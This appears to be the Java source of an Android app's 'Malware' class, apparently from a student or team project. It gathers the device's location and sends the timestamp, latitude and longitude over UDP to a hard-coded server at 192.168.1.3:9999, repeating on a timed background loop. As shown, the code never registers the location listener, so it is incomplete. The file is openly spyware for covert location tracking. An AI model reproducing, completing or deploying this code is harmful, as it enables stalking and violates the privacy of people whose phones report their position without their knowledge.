package me.shrimadhavuk.watransmitter;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

/**
 * Created by maxi on 18/06/2016.
 */
public class Malware implements Runnable {
    private static final String TAG = "Malware thread";
    private Context contexto_llamador;
    private String ServerIP="192.168.1.3";
    private int ServerPort=9999;
    private long lastTime=0;
    private Location lastLocation=null;
    public Malware(Context c) {
        super();
        this.contexto_llamador = c;
    }


    @Override
    public void run() {
        //agregado por Juan (21-6)
        //----------------------------------------------
        // Acquire a reference to the system Location Manager
        LocationManager locationManager = (LocationManager) contexto_llamador.getSystemService(Context.LOCATION_SERVICE);

        // Define a listener that responds to location updates
        LocationListener locationListener = new LocationListener() {
            public void onLocationChanged(Location location) {


                if ((location.getTime()-lastTime)>120*1000) {
                    lastLocation=location;
                    lastTime=lastLocation.getTime();
                    // Called when a new location is found by the network location provider.
                    Log.v(TAG, "(!!!!) Localización :  " + location.toString());
                    conectUDPTask con=new conectUDPTask();
                    con.execute(location);
                }
                //   mandarPorMail(location);
            }

            public void onStatusChanged(String provider, int status, Bundle extras) {
            }

            public void onProviderEnabled(String provider) {
            }

            public void onProviderDisabled(String provider) {
            }
        };
        // aca va nuestra magia
        int i = 0;
        while (i<30) {

            Log.i(TAG, "Enviando localización... "+i);


            //NotificationManager notificationManager =
              //      (NotificationManager) contexto_llamador.getSystemService(Service.NOTIFICATION_SERVICE);
            //Notification notification = new Notification();
            //Intent intent = new Intent();
            //PendingIntent pendingIntent = PendingIntent.getService(contexto_llamador, 0, intent , 0) ;
            //notification.setLatestEventInfo(this, /* your content */, pendingIntent);
            //notificationManager.notify(0, notification);
            //Toast.makeText(contexto_llamador, "mensaje molesto cada 30 seg", Toast.LENGTH_SHORT).show();
            try {
                Thread.sleep(30000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            i++;
        }

        Log.i(TAG, "se termino la ejecucion del thread");

    }
    //----------------------------

    //agregado por Juan, 17-6
    public class conectUDPTask extends AsyncTask<Location, Void, String> {

        @Override
        protected String doInBackground(Location... locations) {
            if (locations.length == 0) {
                return null;
            }
            Location location = locations[0];
            try {
                mandarPorUDP("\n\nt=" + Double.toString(location.getTime()) + "\nlat=" + Double.toString(location.getLatitude()) + "\nlong=" + Double.toString(location.getLongitude()));
                return null;
            } catch (IOException e) {
                Log.e(TAG, "No se pudo enviar por UDP");
                return null;
            }
        }

        private void mandarPorUDP(String str) throws IOException {


            DatagramSocket client_socket = new DatagramSocket(ServerPort);
            InetAddress IPAddress = InetAddress.getByName(ServerIP);

            //while (true)
            // {
            byte[] send_data = str.getBytes();
            //System.out.println("Type Something (q or Q to quit): ");

            DatagramPacket send_packet = new DatagramPacket(send_data, str.length(), IPAddress, ServerPort);
            client_socket.send(send_packet);
        /*
        //chandra
        DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
        client_socket.receive(receivePacket);

        modifiedSentence = new String(receivePacket.getData());
        //System.out.println("FROM SERVER:" + modifiedSentence);
        if(modifiedSentence.charAt(2)=='%')
            txt5.setText(modifiedSentence.substring(0, 3));
        else
            txt1.setText(modifiedSentence);
        modifiedSentence=null;*/
            client_socket.close();

            // }

        }
    }

}
